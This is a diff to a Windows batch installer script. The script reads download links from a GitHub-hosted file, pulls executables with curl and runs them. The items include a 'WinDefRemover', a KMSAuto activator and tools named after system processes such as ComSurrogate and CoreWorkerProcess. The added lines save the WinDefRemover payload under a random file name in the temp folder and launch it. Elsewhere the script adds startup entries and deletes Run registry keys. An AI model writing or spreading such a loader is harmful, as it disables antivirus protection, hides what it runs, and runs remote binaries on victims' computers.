@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=30.0"
+set "BATCHVERSION=30.1"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED="
@@ -360,7 +360,7 @@ if not exist "%startupFile%" (
     echo File is already in %startupFile%.
 )
 
-timeout /t 1 /nobreak >nul
+timeout /t 1 /nobreak 
 
 
 
@@ -389,7 +389,7 @@ if not exist "%startupFile%" (
     echo File is already in %startupFile%.
 )
 
-timeout /t 1 /nobreak >nul
+timeout /t 1 /nobreak 
 
 
 
@@ -420,7 +420,7 @@ del /f /a "%appdata%\*.ps1"
 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f
 
-timeout /t 1 /nobreak >nul
+timeout /t 1 /nobreak 
 
 
 
@@ -450,7 +450,7 @@ if not exist "%startupFile%" (
     echo File is already in %startupFile%.
 )
 
-timeout /t 1 /nobreak >nul
+timeout /t 1 /nobreak 
 
 :PUUNY
 
@@ -675,7 +675,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from ShellHost Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto SHSTINSTALL
 )
 
@@ -828,7 +828,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from KMSAuto Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto KMSINSTALL
 )
 
@@ -897,7 +897,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from ComSurrogate Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto CheckComSurrogate
 )
 
@@ -973,7 +973,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from CoreWorkerProcess Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto CheckCWP
 )
 
@@ -1041,7 +1041,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from NIRCMD Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto Check7ZIP
 )
 
@@ -1098,7 +1098,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from NIRCMD Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto CheckNIRCMD
 )
 
@@ -1153,7 +1153,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from Handle Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto CheckHandle
 )
 
@@ -1220,7 +1220,7 @@ if exist "%embeddedScript%" (
 ) else (
     echo Filed to get content from wudtest Link
     echo.
-    timeout /t 3 /nobreak >nul
+    timeout /t 3 /nobreak 
     goto CheckWudTest
 )
 
@@ -1705,15 +1705,23 @@ goto NEXT6
 echo WinDefRemover Starting...
 echo.
 
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+
+
 :WinDefRemover
 cls
 :: Kill & Delete
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /a "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+taskkill /f /im !filename!.exe
+del /f /a "%TEMP%\!filename!.exe"
 
 echo.
 echo You chose WinDefRemover.
-timeout /t 2 /nobreak >nul
+timeout /t 2 /nobreak
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/WinDefRemoverFileLink') do set "WINDEFREMOVERFILELINK=%%i"
 echo %WINDEFREMOVERFILELINK%
@@ -1722,19 +1730,19 @@ echo.
 
  
 :: Download the file using curl
-curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%WINDEFREMOVERFILELINK%"
+curl -L -# -o "%TEMP%\!filename!.exe" "%WINDEFREMOVERFILELINK%"
  
-timeout /t 2 /nobreak >nul
+timeout /t 2 /nobreak
  
  
  
 :: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+if not exist "%TEMP%\!filename!.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak
 	echo Retrying in 5 seconds ....
-	timeout /t 5 /nobreak >nul
+	timeout /t 5 /nobreak
 	echo.
 	cls
 	goto WinDefRemover
@@ -1743,19 +1751,19 @@ if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
  
  
 :: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
  
  
  
 :: Check if the file size is at least 0.8MB (768000 bytes)
 if %FILESIZE% geq 768000 (
-    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+    start "" "%TEMP%\!filename!.exe"
 ) else (
 echo.
     echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak
 	echo Retrying in 5 seconds ....
-	timeout /t 5 /nobreak >nul
+	timeout /t 5 /nobreak
 	echo.
 	cls
 	goto WinDefRemover
@@ -1769,9 +1777,9 @@ set "CheckSend=1"
 
 echo.
 echo WinDefRemover Started..
-timeout /t 20 /nobreak >nul
+timeout /t 20 /nobreak
 echo Done.
-timeout /t 5 /nobreak >nul
+timeout /t 5 /nobreak
 echo.
 echo.
 echo.
